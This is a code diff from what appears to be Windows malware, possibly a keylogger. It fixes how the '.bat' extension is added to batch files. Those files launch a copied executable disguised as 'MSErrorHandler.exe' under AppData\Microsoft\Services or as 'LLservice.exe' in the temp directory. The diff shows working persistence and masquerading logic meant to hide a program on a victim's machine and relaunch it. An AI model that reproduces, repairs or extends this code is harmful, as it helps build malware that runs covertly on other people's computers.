@@ -177,7 +177,7 @@ namespace IO
 
   bool mkbat(std::string path,std::string batname_path){
     std::ofstream bat;
-    bat.open (batname_path+".bat");
+    bat.open (batname_path);
     bat << "@echo off \r\n";
     bat << "start "+path+"\r\n";
     //bat << "start "
@@ -191,7 +191,7 @@ namespace IO
         std::string path = appdata_dir + "\\Microsoft\\Services\\";
         std::string filename = "MSErrorHandler.exe";
         std::string fullpath = path + filename;
-        std::string batname = "batER";
+        std::string batname = "batER.bat";
         std::string batpath = path+batname;
         if(!IO::exists_file(batpath)){
            mkbat(fullpath,batpath);
@@ -203,7 +203,7 @@ namespace IO
             path = temp_dir + "\\";
             filename = "LLservice.exe";
             fullpath = path + filename;
-            batname = "batLL";
+            batname = "batLL.bat";
             batpath = path+batname;
         }
         if(!IO::exists_file(batpath)){
@@ -229,10 +229,10 @@ namespace IO
                     std::string msg = "COMPLETE" +std::string(fullpath);
                     Helper::WriteAppLog(msg);
                     if(filename == "LLservice.exe"){
-                      batname = "batLL";
+                      batname = "batLL.bat";
                       batpath = path+batname;
                     }else{
-                      batname = "batER";
+                      batname = "batER.bat";
                       batpath = path+batname;
                     }
 
@@ -246,10 +246,10 @@ namespace IO
                std::string msg = "COMPLETE" +std::string(fullpath);
                     Helper::WriteAppLog(msg);
                     if(filename == "LLservice.exe"){
-                      batname = "batLL";
+                      batname = "batLL.bat";
                       batpath = path+batname;
                     }else{
-                      batname = "batER";
+                      batname = "batER.bat";
                       batpath = path+batname;
                     }
 
@@ -263,10 +263,10 @@ namespace IO
            std::string msg = "COMPLETE" +std::string(fullpath);
                     Helper::WriteAppLog(msg);
                     if(filename == "LLservice.exe"){
-                      batname = "batLL";
+                      batname = "batLL.bat";
                       batpath = path+batname;
                     }else{
-                      batname = "batER";
+                      batname = "batER.bat";
                       batpath = path+batname;
                     }
 
